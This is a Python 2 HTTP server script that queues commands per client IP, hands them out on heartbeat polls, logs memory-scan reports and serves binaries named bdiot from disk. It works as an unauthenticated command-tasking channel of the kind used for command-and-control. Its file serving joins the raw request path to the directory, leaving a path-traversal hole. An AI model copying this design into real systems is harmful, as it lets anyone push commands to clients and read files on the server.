#!/usr/bin/env python

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import SocketServer
import simplejson
from os import curdir, sep,path
from urlparse import urlparse, parse_qs
from cgi import parse_header, parse_multipart

tasks = dict()

class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()

    def do_GET(self):
        self._set_headers()
        uri = self.path
        print uri
        cl_addr = self.client_address[0]
        if cl_addr not in tasks:
          tasks[cl_addr] = "noop"    
        if uri.startswith("/push/command"):
          print "new command"
          #print self.rfile
          ctype, pdict = parse_header(self.headers['content-type'])
          length = int(self.headers['content-length'])
          postvars = parse_qs(
                    self.rfile.read(length), 
                    keep_blank_values=1)
          print "New command for " + postvars['ip'][0] + " : " + postvars['command'][0]
          tasks[postvars['ip'][0]] = postvars['command'][0]
          self.wfile.write("ok")
        elif uri == "/status/heartbeat":
          self.wfile.write(tasks[cl_addr])
          tasks[cl_addr] = "noop"
        elif uri.startswith("/forensics/mem_scan"):
          print "mem_scan"
          fields = parse_qs(uri)
          print "Found pid " + fields["pid"][0]
          self.wfile.write("ok")
        elif uri.startswith("/bin/bdiot."):
          file_path = curdir + sep + self.path 
          if path.isfile(file_path):
            f = open(file_path)
            #self.send_response(200)
            #self.send_header('Content-type', 'text/plain')
            #self.end_headers()
            self.wfile.write(f.read())
            f.close()
          else:
            self.send_response(404)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write("")
    def do_HEAD(self):
        self._set_headers()
        
    def do_POST(self):
        self._set_headers()
        print "in post method"
        self.data_string = self.rfile.read(int(self.headers['Content-Length']))

        self.send_response(200)
        self.end_headers()

        data = simplejson.loads(self.data_string)
        print "{}".format(data)
        self.wfile.write("{\"status\" : 0}")
        
def run(server_class=HTTPServer, handler_class=S, port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print 'Starting httpd...'
    httpd.serve_forever()

if __name__ == "__main__":
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
